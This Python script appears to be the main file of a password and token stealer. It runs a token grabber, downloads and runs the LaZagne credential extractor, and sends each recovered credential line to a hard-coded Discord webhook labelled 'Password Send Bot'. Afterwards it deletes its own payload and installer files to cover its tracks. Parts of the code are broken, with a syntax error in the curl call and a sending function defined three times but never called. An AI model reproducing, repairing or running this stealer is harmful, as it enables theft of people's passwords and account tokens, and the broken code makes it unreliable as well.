from time import sleep
import os
from discord_webhook import *
import urllib
import send_passwords
from logging_bot import log

log("started main.py")

#download_link = "https://download1655.mediafire.com/ve9ey3rh72ag/t8vr5soxiv5ozvf/payload1.zip" # link the mirror (this is old version)
download_link = "https://download1655.mediafire.com/ve9ey3rh72ag/t8vr5soxiv5ozvf/payload1.zip" # link the mirror  (this is current version)
webhook_url = "https://discordapp.com/api/webhooks/924328384492871700/0ZgV8H7BxLh9IUV2HGDHWLG842gFo_XmF3yhta1iXBR8hJ1kwh4Tif_NpCQf_hJtIoOM"

def send_passwords():
    f = open("credentials.txt", "r")
    logging_bot.log("sending passwords")
    for word in f:
        sleep(0.01)
        content = word
        webhook = DiscordWebhook(url=webhook_url, username="Password Send Bot", content=content, avatar_url="https://cdn-icons-png.flaticon.com/512/37/37362.png")
        response = webhook.execute()

def Download(link, filename):
    os.system("curl " + link " --output " + filename)

def del_all():
    os.system("cd .. ")
    os.system("del payload1")
    os.system("del install.py")
    os.system("del requierments.txt")

def send_passwords():
    f = open("credentials.txt", "r")
    logging_bot.log("sending passwords")
    for word in f:
        sleep(0.01)
        content = word
        webhook = DiscordWebhook(url=webhook_url, username="Password Send Bot", content=content, avatar_url="https://cdn-icons-png.flaticon.com/512/37/37362.png")
        response = webhook.execute()

log("run token grabber")
os.system("python3 token_grabber_2021.py") # run token grabber
log("download & run laZagne")
Download("https://github.com/AlessandroZ/LaZagne/archive/refs/tags/2.4.3.zip", "laZagne.zip")
os.system("tar -xf laZagne.zip") # run laZagne password (browser) extracter
os.system("cd laZagne/Windows")
os.system('python3 laZagne.py')

log("sending passwords")
def send_passwords():
    f = open("laZagne/Windows/credentials.txt", "r")
    logging_bot.log("sending passwords")
    for word in f:
        sleep(0.01)
        content = word
        webhook = DiscordWebhook(url=webhook_url, username="Password Send Bot", content=content, avatar_url="https://cdn-icons-png.flaticon.com/512/37/37362.png")
        response = webhook.execute()
log("sending passwords")

del_all()
log("everything is done")
